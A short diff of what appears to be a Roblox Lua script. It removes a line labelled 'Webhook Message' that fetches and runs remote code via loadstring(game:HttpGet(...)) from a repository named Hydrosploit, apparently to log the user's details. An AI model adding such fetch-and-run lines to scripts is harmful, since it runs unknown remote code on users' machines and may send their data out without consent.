@@ -1,6 +1,3 @@
---// Webhook Message
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Hydrosploit/Celestial/main/Exe-Log"))()
-
 
 
 --// Discord Invite
